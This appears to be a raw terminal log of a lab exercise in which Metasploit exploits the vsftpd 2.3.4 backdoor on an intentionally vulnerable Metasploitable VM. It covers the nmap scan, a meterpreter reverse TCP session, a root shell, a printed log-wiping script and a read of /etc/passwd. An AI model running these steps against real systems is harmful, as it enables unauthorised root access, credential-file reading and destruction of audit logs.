@@ -1,0 +1,408 @@
+                                                                                                                                                                                                         
+┌──(kali㉿kali)-[~]
+└─$ msfconsole 
+Metasploit tip: Use the resource command to run commands from a file
+                                                  
+               .;lxO0KXXXK0Oxl:.
+           ,o0WMMMMMMMMMMMMMMMMMMKd,
+        'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,
+      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:
+    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,
+   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo
+  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk
+ oMMMMMMMMMMx.                    dMMMMMMMMMMx
+.WMMMMMMMMM:                       :MMMMMMMMMM,
+xMMMMMMMMMo                         lMMMMMMMMMO
+NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;
+MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
+NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:
+xMMMMMMMMMd                        ,0MMMMMMMMMMK;
+.WMMMMMMMMMc                         'OMMMMMM0,
+ lMMMMMMMMMMk.                         .kMMO'
+  dMMMMMMMMMMWd'                         ..
+   cWMMMMMMMMMMMNxc'.                ##########
+    .0MMMMMMMMMMMMMMMMWc            #+#    #+#
+      ;0MMMMMMMMMMMMMMMo.          +:+
+        .dNMMMMMMMMMMMMo          +#++:++#+
+           'oOWMMMMMMMMo                +:+
+               .,cdkO0K;        :+:    :+:                                
+                                :::::::+:
+                      Metasploit
+
+       =[ metasploit v6.4.126-dev                               ]
++ -- --=[ 2,638 exploits - 1,331 auxiliary - 2,153 payloads     ]
++ -- --=[ 432 post - 49 encoders - 14 nops - 12 evasion         ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > db_nmap -sV 10.0.2.3
+[*] Nmap: Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-21 03:59 -0400
+[*] Nmap: Nmap scan report for 10.0.2.3
+[*] Nmap: Host is up (0.00028s latency).
+[*] Nmap: Not shown: 977 closed tcp ports (reset)
+[*] Nmap: PORT     STATE SERVICE     VERSION
+[*] Nmap: 21/tcp   open  ftp         vsftpd 2.3.4
+[*] Nmap: 22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+[*] Nmap: 23/tcp   open  telnet      Linux telnetd
+[*] Nmap: 25/tcp   open  smtp        Postfix smtpd
+[*] Nmap: 53/tcp   open  domain      ISC BIND 9.4.2
+[*] Nmap: 80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+[*] Nmap: 111/tcp  open  rpcbind     2 (RPC #100000)
+[*] Nmap: 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+[*] Nmap: 445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+[*] Nmap: 512/tcp  open  exec        netkit-rsh rexecd
+[*] Nmap: 513/tcp  open  login       OpenBSD or Solaris rlogind
+[*] Nmap: 514/tcp  open  tcpwrapped
+[*] Nmap: 1099/tcp open  java-rmi    GNU Classpath grmiregistry
+[*] Nmap: 1524/tcp open  bindshell   Metasploitable root shell
+[*] Nmap: 2049/tcp open  nfs         2-4 (RPC #100003)
+[*] Nmap: 2121/tcp open  ftp         ProFTPD 1.3.1
+[*] Nmap: 3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+[*] Nmap: 5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+[*] Nmap: 5900/tcp open  vnc         VNC (protocol 3.3)
+[*] Nmap: 6000/tcp open  X11         (access denied)
+[*] Nmap: 6667/tcp open  irc         UnrealIRCd
+[*] Nmap: 8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+[*] Nmap: 8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+[*] Nmap: MAC Address: 08:00:27:AD:9F:25 (Oracle VirtualBox virtual NIC)
+[*] Nmap: Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 12.16 seconds
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.26/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
+msf > Interrupt: use the 'exit' command to quit
+msf > vsftpd 2.3.4
+[-] Unknown command: vsftpd. Run the help command for more details.
+msf > search vsftpd2.3.4
+[-] No results from search
+msf > search vsftpd 2.3.4
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD 2.3.4 Backdoor Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
+
+msf > use                                           0
+[*] Using configured payload cmd/linux/http/x86/meterpreter_reverse_tcp
+msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 10.0.2.3
+RHOST => 10.0.2.3
+msf exploit(unix/ftp/vsftpd_234_backdoor) > run
+[-] 10.0.2.3:21 - Msf::OptionValidateError One or more options failed to validate: LHOST.
+msf exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 10.0.2.15
+LHOST => 10.0.2.15
+msf exploit(unix/ftp/vsftpd_234_backdoor) > run
+[*] Started reverse TCP handler on 10.0.2.15:4444                                                                                                                                                        
+[+] 10.0.2.3:21 - Backdoor has been spawned!                                                                                                                                                             
+[*] Meterpreter session 1 opened (10.0.2.15:4444 -> 10.0.2.3:53820) at 2026-05-21 04:02:45 -0400                                                                                                         
+                                                                                                                                                                                                         
+meterpreter > whoami
+[-] Unknown command: whoami. Run the help command for more details.                                                                                                                                      
+meterpreter > whoami                                                                                                                                                                                     
+[-] Unknown command: whoami. Run the help command for more details.                                                                                                                                      
+meterpreter > who am i                                                                                                                                                                                   
+[-] Unknown command: who. Run the help command for more details.                                                                                                                                         
+meterpreter > help                                                                                                                                                                                       
+                                                                                                                                                                                                         
+Core Commands                                                                                                                                                                                            
+=============                                                                                                                                                                                            
+                                                                                                                                                                                                         
+    Command                   Description                                                                                                                                                                
+    -------                   -----------                                                                                                                                                                
+    ?                         Help menu                                                                                                                                                                  
+    background                Backgrounds the current session                                                                                                                                            
+    bg                        Alias for background                                                                                                                                                       
+    bgkill                    Kills a background meterpreter script                                                                                                                                      
+    bglist                    Lists running background scripts                                                                                                                                           
+    bgrun                     Executes a meterpreter script as a background thread                                                                                                                       
+    channel                   Displays information or control active channels                                                                                                                            
+    close                     Closes a channel                                                                                                                                                           
+    detach                    Detach the meterpreter session (for http/https)                                                                                                                            
+    disable_unicode_encoding  Disables encoding of unicode strings                                                                                                                                       
+    enable_unicode_encoding   Enables encoding of unicode strings                                                                                                                                        
+    exit                      Terminate the meterpreter session
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command                   Description
+    -------                   -----------
+    cat                       Read the contents of a file to the screen
+    cd                        Change directory
+    checksum                  Retrieve the checksum of a file
+    chmod                     Change the permissions of a file
+    cp                        Copy source to destination
+    del                       Delete the specified file
+    dir                       List files (alias for ls)
+    download                  Download a file or directory
+    edit                      Edit a file
+    getlwd                    Print local working directory (alias for lpwd)
+    getwd                     Print working directory
+    lcat                      Read the contents of a local file to the screen
+    lcd                       Change local working directory
+    ldir                      List local files (alias for lls)
+    lls                       List local files
+    lmkdir                    Create new directory on local machine
+    lpwd                      Print local working directory
+    ls                        List files
+    mkdir                     Make directory
+    mv                        Move source to destination
+    pwd                       Print working directory
+    rm                        Delete the specified file
+    rmdir                     Remove directory
+    search                    Search for files
+    upload                    Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command                   Description
+    -------                   -----------
+    arp                       Display the host ARP cache
+    getproxy                  Display the current proxy configuration
+    ifconfig                  Display interfaces
+    ipconfig                  Display interfaces
+    netstat                   Display the network connections
+    portfwd                   Forward a local port to a remote service
+    resolve                   Resolve a set of host names on the target
+    route                     View and modify the routing table
+
+
+Stdapi: System Commands
+=======================
+
+    Command                   Description
+    -------                   -----------
+    execute                   Execute a command
+    getenv                    Get one or more environment variable values
+    getpid                    Get the current process identifier
+    getuid                    Get the user that the server is running as
+    kill                      Terminate a process
+    localtime                 Displays the target system local date and time
+    pgrep                     Filter processes by name
+    pkill                     Terminate processes by name
+    ps                        List running processes
+    shell                     Drop into a system command shell
+    suspend                   Suspends or resumes a list of processes
+    sysinfo                   Gets information about the remote system, such as OS
+
+
+Stdapi: Webcam Commands
+=======================
+
+    Command                   Description
+    -------                   -----------
+    webcam_chat               Start a video chat
+    webcam_list               List webcams
+    webcam_snap               Take a snapshot from the specified webcam
+    webcam_stream             Play a video stream from the specified webcam
+
+
+Stdapi: Mic Commands
+====================
+
+    Command                   Description
+    -------                   -----------
+    listen                    listen to a saved audio recording via audio player
+    mic_list                  list all microphone interfaces
+    mic_start                 start capturing an audio stream from the target mic
+    mic_stop                  stop capturing audio
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command                   Description
+    -------                   -----------
+    play                      play a waveform audio file (.wav) on the target system
+
+For more info on a specific command, use <command> -h or help <command>.
+
+meterpreter > id
+[-] Unknown command: id. Run the help command for more details.
+meterpreter > id
+[-] Unknown command: id. Run the help command for more details.
+meterpreter > hostname
+[-] Unknown command: hostname. Run the help command for more details.
+meterpreter > ls -a
+Listing: /
+==========
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+100700/rwx------  1188612  fil   2026-05-21 04:02:47 -0400  GrIBGiHGAu
+040755/rwxr-xr-x  4096     dir   2012-05-13 23:35:33 -0400  bin
+040755/rwxr-xr-x  1024     dir   2012-05-13 23:36:28 -0400  boot
+040755/rwxr-xr-x  4096     dir   2010-03-16 18:55:51 -0400  cdrom
+040755/rwxr-xr-x  13480    dir   2026-05-21 03:20:42 -0400  dev
+040755/rwxr-xr-x  4096     dir   2026-05-21 04:00:44 -0400  etc
+100700/rwx------  1188612  fil   2026-05-13 07:36:16 -0400  hdQQqxbRJ
+040755/rwxr-xr-x  4096     dir   2010-04-16 02:16:02 -0400  home
+040755/rwxr-xr-x  4096     dir   2010-03-16 18:57:40 -0400  initrd
+100644/rw-r--r--  7929183  fil   2012-05-13 23:35:56 -0400  initrd.img
+040755/rwxr-xr-x  4096     dir   2012-05-13 23:35:22 -0400  lib
+040700/rwx------  16384    dir   2010-03-16 18:55:15 -0400  lost+found
+040755/rwxr-xr-x  4096     dir   2010-03-16 18:55:52 -0400  media
+040755/rwxr-xr-x  4096     dir   2010-04-28 16:16:56 -0400  mnt
+100700/rwx------  1188612  fil   2026-05-13 07:32:27 -0400  nhXieSoJmhO
+100600/rw-------  12310    fil   2026-05-21 03:20:50 -0400  nohup.out
+040755/rwxr-xr-x  4096     dir   2010-03-16 18:57:39 -0400  opt
+040555/r-xr-xr-x  0        dir   2026-05-21 03:20:33 -0400  proc
+040755/rwxr-xr-x  4096     dir   2026-05-21 03:20:50 -0400  root
+040755/rwxr-xr-x  4096     dir   2012-05-13 21:54:53 -0400  sbin
+040755/rwxr-xr-x  4096     dir   2010-03-16 18:57:38 -0400  srv
+040755/rwxr-xr-x  0        dir   2026-05-21 03:20:34 -0400  sys
+041777/rwxrwxrwx  4096     dir   2026-05-21 04:03:46 -0400  tmp
+040755/rwxr-xr-x  4096     dir   2010-04-28 00:06:37 -0400  usr
+040755/rwxr-xr-x  4096     dir   2010-03-17 10:08:23 -0400  var
+100644/rw-r--r--  1987288  fil   2008-04-10 12:55:41 -0400  vmlinuz
+
+meterpreter > whoami
+[-] Unknown command: whoami. Run the help command for more details.
+meterpreter > Whoami
+[-] Unknown command: Whoami. Run the help command for more details.
+meterpreter > id
+[-] Unknown command: id. Run the help command for more details.
+meterpreter > sheel
+[-] Unknown command: sheel. Did you mean shell? Run the help command for more details.
+meterpreter > cd shell
+[-] stdapi_fs_chdir: Operation failed: 2
+meterpreter > shell
+Process 5719 created.
+Channel 1 created.
+
+
+
+whoami
+root
+id
+uid=0(root) gid=0(root)
+hostname
+metasploitable
+ls
+GrIBGiHGAu
+bin
+boot
+cdrom
+dev
+etc
+hdQQqxbRJ
+home
+initrd
+initrd.img
+lib
+lost+found
+media
+mnt
+nhXieSoJmhO
+nohup.out
+opt
+proc
+root
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+cd root
+ls
+Desktop
+reset_logs.sh
+vnc.log
+cat reset_logs.sh
+#!/bin/sh
+
+/etc/init.d/sysklogd stop
+VARLOGS="auth.log boot btmp daemon.log debug dmesg kern.log mail.info mail.log mail.warn messages syslog udev wtmp"
+cd /var/log
+for ii in $VARLOGS; do
+  echo -n > $ii
+  rm -f $ii.? $ii.?.gz
+done
+
+/etc/init.d/samba stop
+rm -f /var/log/samba/*
+
+rm -f /var/lib/dhcp3/*
+
+for ii in /var/log/proftpd/* /var/log/postgresql/* /var/log/apache2/*; do
+  echo -n > $ii
+done
+
+
+cat vnc.log
+
+New 'X' desktop is metasploitable:0
+
+Starting applications specified in /root/.vnc/xstartup
+Log file is /root/.vnc/metasploitable:0.log
+
+^C
+Terminate channel 1? [y/N]  
+
+
+
+
+
+Process 14214 created.
+Channel 2 created.
+whoami
+root
+idd
+
+id/bin/sh: line 2: idd: command not found
+id     
+/bin/sh: line 4: idid: command not found
+
+
+
+
+id
+uid=0(root) gid=0(root)
+uname -a
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+        
+
+
+la -la /etc/passwd
+/bin/sh: line 14: la: command not found
+ls -la /etc/passwd
+-rw-r--r-- 1 root root 1581 May 13  2012 /etc/passwd
+
+
+cat /etc/passwd | head -10       
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+
